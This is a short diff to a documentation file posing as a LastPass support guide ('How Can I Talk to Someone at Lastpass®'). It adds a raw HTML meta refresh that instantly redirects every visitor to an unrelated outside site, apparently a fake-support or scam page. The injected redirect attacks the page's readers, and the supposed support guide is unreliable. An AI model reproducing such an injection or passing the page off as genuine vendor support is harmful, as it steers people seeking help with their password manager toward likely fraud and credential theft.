@@ -1,3 +1,9 @@
+
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://accuratelivechat.com/">
+
+
 Ways to Reach: How Can I Talk to Someone at Lastpass® – Quick Support Guide
 ============================================
 
